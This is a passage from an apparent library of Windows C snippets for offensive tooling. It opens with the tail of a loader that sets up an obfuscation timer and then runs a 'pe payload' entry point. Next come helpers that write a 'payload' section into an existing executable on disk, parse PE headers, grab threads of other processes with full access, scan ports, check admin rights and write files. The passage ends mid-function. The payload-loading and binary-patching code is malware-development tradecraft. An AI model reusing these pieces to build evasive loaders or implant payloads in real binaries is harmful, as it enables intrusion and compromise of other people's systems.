	if (!(pPeFlucStr->ObfInfo.hTimerQueue = CreateTimerQueue())) {
		printf("[!] CreateTimerQueue Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	/* execute the 'ObfuscationTimerCallback' function after 'EXEC_WAIT' seconds */
	if (!CreateTimerQueueTimer(&pPeFlucStr->ObfInfo.hTimer, pPeFlucStr->ObfInfo.hTimerQueue, (WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00)) {
		printf("[!] CreateTimerQueueTimer Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	/* initializing global struct pointer */
	g_pObfInfo = &pPeFlucStr->ObfInfo;

	/* execute pe payload */
	(*(VOID(*)()) pEntryPoint)();

	bResult = TRUE;

_END_OF_FUNC:

	if (ppPeFluctioationInfo)
		*ppPeFluctioationInfo = pPeFlucStr;
	else
		LocalFree(pPeFlucStr);

	if (pVectoredExptnHandler)
		RemoveVectoredContinueHandler(pVectoredExptnHandler);

	return bResult;
}
```
### Fetch Image NT Headers
```c
#include <windows.h>
#include <stdio.h>
PIMAGE_NT_HEADERS FetchImgNtHdrs(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE)
		return pImgNtHdrs;

	return NULL;
}
```
### Print PE Architecture and Type
```c
#include <windows.h>
#include <stdio.h>
VOID PrintModuleArch(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) {

		printf("[i] Executable File Detected As : ");

		if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL)
			printf("DLL -");
		else if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_SUBSYSTEM_NATIVE)
			printf("SYS -");
		else
			printf("EXE -");

		printf(" %s \n", pImgNtHdrs->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? "x32" : "x64");
	}
}
```
### PE Section Insertion (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#define FILE_ALIGNMENT		0x200

#define ALIGN_UP(X, A) (((X) + ((A) - 1)) / (A) * (A))

BOOL InsertPeSectionA(IN LPCSTR cFileName, IN LPCSTR SectionName, IN ULONG_PTR uNewSectionData, IN SIZE_T sNewSectionSize) {

	if (!cFileName || !SectionName || !uNewSectionData || !sNewSectionSize)
		return FALSE;

	BOOL					bResult			= FALSE;
	HANDLE					hFile			= INVALID_HANDLE_VALUE,
							hMappedFile		= NULL;
	DWORD					dwFileSize		= 0x00;
	ULONG_PTR				uFileBuffer		= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdr		= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr		= NULL,
							pNewSecHdr		= NULL,
							pLastSecHdr		= NULL;

	if ((hFile = CreateFileA(cFileName, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	dwFileSize = ALIGN_UP(dwFileSize + sNewSectionSize, FILE_ALIGNMENT);

	if (!(hMappedFile = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0x00, dwFileSize, NULL))) {
		printf("[!] CreateFileMappingA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(uFileBuffer = MapViewOfFile(hMappedFile, FILE_MAP_READ | FILE_MAP_WRITE, 0x00, 0x00, 0x00))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	pImgNtHdr = (PIMAGE_NT_HEADERS)(uFileBuffer + ((PIMAGE_DOS_HEADER)uFileBuffer)->e_lfanew);
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	// parse sections, get the last section of the pe and the new section
	pImgSecHdr	= IMAGE_FIRST_SECTION(pImgNtHdr);
	pNewSecHdr	= &pImgSecHdr[pImgNtHdr->FileHeader.NumberOfSections];
	pLastSecHdr = &pImgSecHdr[pImgNtHdr->FileHeader.NumberOfSections - 1];

	// zero out our payload section structure
	ZeroMemory(pNewSecHdr, sizeof(IMAGE_SECTION_HEADER));

	// copy over the section name
	memcpy(&pNewSecHdr->Name, SectionName, IMAGE_SIZEOF_SHORT_NAME);

	// set section values, size and characteristics
	pNewSecHdr->Misc.VirtualSize	= sNewSectionSize;
	pNewSecHdr->VirtualAddress		= ALIGN_UP((pLastSecHdr->VirtualAddress + pLastSecHdr->Misc.VirtualSize), pImgNtHdr->OptionalHeader.SectionAlignment);
	pNewSecHdr->SizeOfRawData		= ALIGN_UP(sNewSectionSize, pImgNtHdr->OptionalHeader.FileAlignment);
	pNewSecHdr->PointerToRawData	= pLastSecHdr->PointerToRawData + pLastSecHdr->SizeOfRawData;
	pNewSecHdr->Characteristics		= IMAGE_SCN_MEM_READ;

	// copy over the payload data to the newly created section
	memcpy((PVOID)(uFileBuffer + pNewSecHdr->PointerToRawData), uNewSectionData, sNewSectionSize);

	// modify the NtHeader to take in account the changes like adding a new section + incrementing the sectio
	pImgNtHdr->FileHeader.NumberOfSections++;
	pImgNtHdr->OptionalHeader.SizeOfImage = pNewSecHdr->VirtualAddress + ALIGN_UP(sNewSectionSize, pImgNtHdr->OptionalHeader.SectionAlignment);

	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (hMappedFile != NULL)
		CloseHandle(hMappedFile);
	if (uFileBuffer != NULL)
		UnmapViewOfFile((LPCVOID)uFileBuffer);
	return bResult;
}
```
### Fetch Image Section Header
```c
#include <windows.h>
PIMAGE_SECTION_HEADER FetchImgSectionHdr(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return IMAGE_FIRST_SECTION(pImgNtHdrs);
}
```
### Fetch The Image's PE Header Size
```c
#include <windows.h>
DWORD FetchImgHeaderSize(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs->OptionalHeader.SizeOfHeaders;
}
```
### Fetch The PE Image's Size
```c
#include <windows.h>
DWORD FetchImgSize(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}
```
### PE Section Insertion (Unicode)
```c
#include <windows.h>
#include <stdio.h>
#define FILE_ALIGNMENT		0x200

#define ALIGN_UP(X, A) (((X) + ((A) - 1)) / (A) * (A))

BOOL InsertPeSectionW(IN LPCWSTR szFileName, IN LPCSTR SectionName, IN ULONG_PTR uNewSectionData, IN SIZE_T sNewSectionSize) {

	if (!szFileName || !SectionName || !uNewSectionData || !sNewSectionSize)
		return FALSE;

	BOOL					bResult			= FALSE;
	HANDLE					hFile			= INVALID_HANDLE_VALUE,
							hMappedFile		= NULL;
	DWORD					dwFileSize		= 0x00;
	ULONG_PTR				uFileBuffer		= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdr		= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr		= NULL,
							pNewSecHdr		= NULL,
							pLastSecHdr		= NULL;

	if ((hFile = CreateFileW(szFileName, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	dwFileSize = ALIGN_UP(dwFileSize + sNewSectionSize, FILE_ALIGNMENT);

	if (!(hMappedFile = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0x00, dwFileSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(uFileBuffer = MapViewOfFile(hMappedFile, FILE_MAP_READ | FILE_MAP_WRITE, 0x00, 0x00, 0x00))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	pImgNtHdr = (PIMAGE_NT_HEADERS)(uFileBuffer + ((PIMAGE_DOS_HEADER)uFileBuffer)->e_lfanew);
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	// parse sections, get the last section of the pe and the new section
	pImgSecHdr	= IMAGE_FIRST_SECTION(pImgNtHdr);
	pNewSecHdr	= &pImgSecHdr[pImgNtHdr->FileHeader.NumberOfSections];
	pLastSecHdr = &pImgSecHdr[pImgNtHdr->FileHeader.NumberOfSections - 1];

	// zero out our payload section structure
	ZeroMemory(pNewSecHdr, sizeof(IMAGE_SECTION_HEADER));

	// copy over the section name
	memcpy(&pNewSecHdr->Name, SectionName, IMAGE_SIZEOF_SHORT_NAME);

	// set section values, size and characteristics
	pNewSecHdr->Misc.VirtualSize	= sNewSectionSize;
	pNewSecHdr->VirtualAddress		= ALIGN_UP((pLastSecHdr->VirtualAddress + pLastSecHdr->Misc.VirtualSize), pImgNtHdr->OptionalHeader.SectionAlignment);
	pNewSecHdr->SizeOfRawData		= ALIGN_UP(sNewSectionSize, pImgNtHdr->OptionalHeader.FileAlignment);
	pNewSecHdr->PointerToRawData	= pLastSecHdr->PointerToRawData + pLastSecHdr->SizeOfRawData;
	pNewSecHdr->Characteristics		= IMAGE_SCN_MEM_READ;

	// copy over the payload data to the newly created section
	memcpy((PVOID)(uFileBuffer + pNewSecHdr->PointerToRawData), uNewSectionData, sNewSectionSize);

	// modify the NtHeader to take in account the changes like adding a new section + incrementing the sectio
	pImgNtHdr->FileHeader.NumberOfSections++;
	pImgNtHdr->OptionalHeader.SizeOfImage = pNewSecHdr->VirtualAddress + ALIGN_UP(sNewSectionSize, pImgNtHdr->OptionalHeader.SectionAlignment);

	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (hMappedFile != NULL)
		CloseHandle(hMappedFile);
	if (uFileBuffer != NULL)
		UnmapViewOfFile((LPCVOID)uFileBuffer);
	return bResult;
}
```
### Fetch Image Optional Header
```c
#include <windows.h>
PIMAGE_OPTIONAL_HEADER FetchImgOptionalHdr(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	if (pImgNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC)
		return &pImgNtHdrs->OptionalHeader;

	return NULL;
}
```
### Fetch Image Preferable Address
```c
#include <windows.h>
#include <stdio.h>
ULONG_PTR FetchImgPreferableAddress(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs->OptionalHeader.ImageBase;
}
```
### Print PE Data Directories
```c
#include <windows.h>
#include <stdio.h>
VOID ListImgDataDirectories(IN ULONG_PTR uModule, IN PIMAGE_NT_HEADERS pImgNtHdrs) {

	if (!uModule || !pImgNtHdrs || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return;

	printf("[*] Base Relocation Table At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

	printf("[*] Debug Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size);

	printf("[*] Exception Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size);

	printf("[*] Export Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size);

	printf("[*] Import Address Table At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size);

	printf("[*] Import Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

	printf("[*] Resource Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size);

	printf("[*] TLS Directory At 0x%p Of Size: %d \n",
		(PVOID)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress),
		pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size);

}
```
### Print PE Sections Details
```c
#include <windows.h>
#include <stdio.h>
VOID ListImgSections(IN ULONG_PTR uModule, IN PIMAGE_NT_HEADERS pImgNtHdrs) {

	if (!uModule || !pImgNtHdrs || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return;

	PIMAGE_SECTION_HEADER pImgSectionHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		printf("[#] %s \n", (CHAR*)pImgSectionHdr[i].Name);
		printf("\tSize: %d \n", pImgSectionHdr[i].SizeOfRawData);
		printf("\tAddress: 0x%p \n", (PVOID)(uModule + pImgSectionHdr[i].VirtualAddress));
		printf("\tRelocations: %d \n", pImgSectionHdr[i].NumberOfRelocations);
		printf("\tPermissions: ");
		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			printf("PAGE_READONLY");
		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE && pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			printf(" | PAGE_READWRITE");
		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			printf(" | PAGE_EXECUTE");
		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE && pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			printf(" | PAGE_EXECUTE_READWRITE");
		printf("\n\n");
	}
}
```
### Print PE Directory Structures
```c
#include <windows.h>
#include <stdio.h>
VOID ListPeDirStructs(IN ULONG_PTR uModule, IN PIMAGE_NT_HEADERS pImgNtHdrs) {

	if (!uModule || !pImgNtHdrs || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return;

	PIMAGE_DATA_DIRECTORY			pBaseRelocDataDirectory		= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	PIMAGE_BASE_RELOCATION			pImgBaseRelocation			= (PIMAGE_BASE_RELOCATION)(uModule + pBaseRelocDataDirectory->VirtualAddress);
	printf("[i] pImgBaseRelocation: 0x%p \n", pImgBaseRelocation);

	PIMAGE_DATA_DIRECTORY			pImportDataDirectory		= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	PIMAGE_IMPORT_DESCRIPTOR		pImgImportDescriptor		= (PIMAGE_IMPORT_DESCRIPTOR)(uModule + pImportDataDirectory->VirtualAddress);
	printf("[i] pImgImportDescriptor: 0x%p \n", pImgImportDescriptor);

	PIMAGE_DATA_DIRECTORY			pTLSDataDirectory			= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
	PIMAGE_TLS_DIRECTORY			pImgTLSDirectory			= (PIMAGE_TLS_DIRECTORY)(uModule + pTLSDataDirectory->VirtualAddress);
	printf("[i] pImgTLSDirectory: 0x%p \n", pImgTLSDirectory);

	PIMAGE_DATA_DIRECTORY			pExceptionDataDirectory		= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
	PIMAGE_RUNTIME_FUNCTION_ENTRY	pImgRuntimeFunc				= (PIMAGE_RUNTIME_FUNCTION_ENTRY)(uModule + pExceptionDataDirectory->VirtualAddress);
	printf("[i] pImgRuntimeFunc: 0x%p \n", pImgRuntimeFunc);

	PIMAGE_DATA_DIRECTORY			pDebugDataDirectory			= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress);
	PIMAGE_DEBUG_DIRECTORY			pImgDebugDirectory			= (PIMAGE_DEBUG_DIRECTORY)(uModule + pDebugDataDirectory->VirtualAddress);
	printf("[i] pImgDebugDirectory: 0x%p \n", pImgDebugDirectory);

	PIMAGE_DATA_DIRECTORY			pExportDataDirectory		= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PIMAGE_EXPORT_DIRECTORY			pImgExportDirectory			= (PIMAGE_EXPORT_DIRECTORY)(uModule + pExportDataDirectory->VirtualAddress);
	printf("[i] pImgExportDirectory: 0x%p \n", pImgExportDirectory);

	PIMAGE_DATA_DIRECTORY			pResourceDataDirectory		= (PIMAGE_DATA_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress);
	PIMAGE_RESOURCE_DIRECTORY		pImgResourceDirectory		= (PIMAGE_RESOURCE_DIRECTORY)(uModule + pResourceDataDirectory->VirtualAddress);
	printf("[i] pImgResourceDirectory: 0x%p \n", pImgResourceDirectory);
}
```
### Fetch Image Entry Point
```c
#include <windows.h>
#include <stdio.h>
ULONG_PTR FetchImgEntryPoint(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return (ULONG_PTR)(uModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
}
```
### Fetch Image DOS Header
```c
#include <windows.h>
PIMAGE_DOS_HEADER FetchImgDosHdr(IN ULONG_PTR uModule) {

	if (!uModule)
		return NULL;

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
	if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)
		return pImgDosHdr;

	return NULL;
}
```
### Retrieving PE Section Base Address by Name
```c
#include <windows.h>
#include <stdio.h>
PVOID FetchSectionBase(IN ULONG_PTR uModuleBase, IN LPSTR SectionName, OUT OPTIONAL PDWORD pdwSectionLength) {

    PIMAGE_NT_HEADERS       pImgNtHdrs        = NULL;
    PIMAGE_SECTION_HEADER   pImgSectionHdr    = NULL;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModuleBase + ((PIMAGE_DOS_HEADER)uModuleBase)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pImgSectionHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        if (strcmp((PSTR)pImgSectionHdr[i].Name, SectionName) == 0x00) {

            if (pdwSectionLength)
                *pdwSectionLength = pImgSectionHdr[i].SizeOfRawData;

            return (PVOID)(uModuleBase + pImgSectionHdr[i].VirtualAddress);
        }
    }

    return NULL;
}
```
### Thread Enumeration via Snapshot
```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL GetRemoteProcThreadViaSnapShot(IN DWORD dwProcessID, OUT DWORD* pdwThreadID, OUT OPTIONAL PHANDLE phThread) {

	THREADENTRY32   ThreadEntry						= { .dwSize = sizeof(THREADENTRY32) };
	HANDLE			hSnapShot						= INVALID_HANDLE_VALUE;

	if (!dwProcessID || !pdwThreadID)
		return FALSE;

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!Thread32First(hSnapShot, &ThreadEntry)) {
		printf("[!] Thread32First Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (ThreadEntry.th32OwnerProcessID == dwProcessID) {

			if (phThread)
				*phThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);

			*pdwThreadID = ThreadEntry.th32ThreadID;

			break;
		}

	} while (Thread32Next(hSnapShot, &ThreadEntry));


_END_OF_FUNC:
	if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return (*pdwThreadID) ? TRUE : FALSE;
}
```
### Directory Enumeration (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL ListFilesInDirectoryA(IN LPCSTR cDirectoryPath) {

	if (!cDirectoryPath)
		return FALSE;

	WIN32_FIND_DATAA	FindFileData			= { 0x00 };
	CHAR				cDir[MAX_PATH * 2]		= { 0x00 };
	HANDLE				hFind					= INVALID_HANDLE_VALUE;
	BOOL				bResult					= FALSE;

	_snprintf_s(cDir, MAX_PATH * 2, MAX_PATH * 2, "%s\\*", cDirectoryPath);


	if ((hFind = FindFirstFileA(cDir, &FindFileData)) == INVALID_HANDLE_VALUE) {
		printf("[!] FindFirstFileA Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			printf("[*] Directory: %s\n", FindFileData.cFileName);
		else
			printf(">\t File: %s\n", FindFileData.cFileName);

	} while (FindNextFileA(hFind, &FindFileData));

	bResult = TRUE;

_END_OF_FUNC:
	if (hFind != INVALID_HANDLE_VALUE)
		FindClose(hFind);
	return bResult;
}
```
### Directory Enumeration (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL ListFilesInDirectoryW(IN LPCWSTR szDirectoryPath) {

	if (!szDirectoryPath)
		return FALSE;

	WIN32_FIND_DATAW	FindFileData			= { 0x00 };
	WCHAR				szDir[MAX_PATH * 2]		= { 0x00 };
	HANDLE				hFind					= INVALID_HANDLE_VALUE;
	BOOL				bResult					= FALSE;

	_snwprintf_s(szDir, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

	if ((hFind = FindFirstFileW(szDir, &FindFileData)) == INVALID_HANDLE_VALUE) {
		printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			printf("[*] Directory: %ws\n", FindFileData.cFileName);
		else
			printf("\t> File: %ws\n", FindFileData.cFileName);

	} while (FindNextFileW(hFind, &FindFileData));

	bResult = TRUE;

_END_OF_FUNC:
	if (hFind != INVALID_HANDLE_VALUE)
		FindClose(hFind);
	return bResult;
}
```
### UDP Port Scanning
```c
#include <windows.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

BOOL ScanUDPPorts(IN LPCSTR IpAddress, IN DWORD dwStartPort, IN DWORD dwEndPort) {

    BOOL                bResult     = FALSE;
    WSADATA             WsaData     = { 0 };
    SOCKET              Socket      = { 0 };
    struct sockaddr_in  Server      = { 0 };


    if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
        printf("[!] WSAStartup Failed With Error: %d\n", WSAGetLastError());
        return FALSE;
    }

    for (int port = dwStartPort; port <= dwEndPort; port++) {
        if ((Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
            printf("[!] socket Failed With Error: %d\n", WSAGetLastError());
            goto _END_OF_FUNC;
        }

        Server.sin_family       = AF_INET;
        Server.sin_addr.s_addr  = inet_addr(IpAddress);
        Server.sin_port         = htons(port);

        if (connect(Socket, (struct sockaddr*)&Server, sizeof(Server)) == 0x00) {
            printf("<i> Port %d is open.\n", port);
            bResult = TRUE;
        }

        closesocket(Socket);
    }

_END_OF_FUNC:
    WSACleanup();
    return bResult;
}
```
### TCP Port Scanning
```c
#include <windows.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

BOOL ScanTCPPorts(IN LPCSTR IpAddress, IN DWORD dwStartPort, IN DWORD dwEndPort) {

    BOOL                bResult     = FALSE;
    WSADATA             WsaData     = { 0 };
    SOCKET              Socket      = { 0 };
    struct sockaddr_in  Server      = { 0 };


    if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
        printf("[!] WSAStartup Failed With Error: %d\n", WSAGetLastError());
        return FALSE;
    }

    for (int port = dwStartPort; port <= dwEndPort; port++) {
        if ((Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
            printf("[!] socket Failed With Error: %d\n", WSAGetLastError());
            goto _END_OF_FUNC;
        }

        Server.sin_family       = AF_INET;
        Server.sin_addr.s_addr  = inet_addr(IpAddress);
        Server.sin_port         = htons(port);

        if (connect(Socket, (struct sockaddr*)&Server, sizeof(Server)) == 0x00) {
            printf("<i> Port %d is open.\n", port);
            bResult = TRUE;
        }

        closesocket(Socket);
    }

_END_OF_FUNC:
    WSACleanup();
    return bResult;
}
```
### Check User's Administrative Status
```c
#include <windows.h>
#include <stdio.h>
BOOL IsUserAdmin() {

    SID_IDENTIFIER_AUTHORITY    NtAuthority             = SECURITY_NT_AUTHORITY;
    PSID                        AdministratorsGroup     = NULL;
    BOOL                        bResult                 = FALSE;

    if (AllocateAndInitializeSid(&NtAuthority, 0x02, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &bResult))
            bResult = FALSE;

        FreeSid(AdministratorsGroup);
    }

    return bResult;
}
```
### Write File To Disk (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL WriteFileToDiskW(IN LPCWSTR szFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {

	HANDLE		hFile						= INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten		= 0x00;

	if (!szFileName || !pFileBuffer || !dwFileSize)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
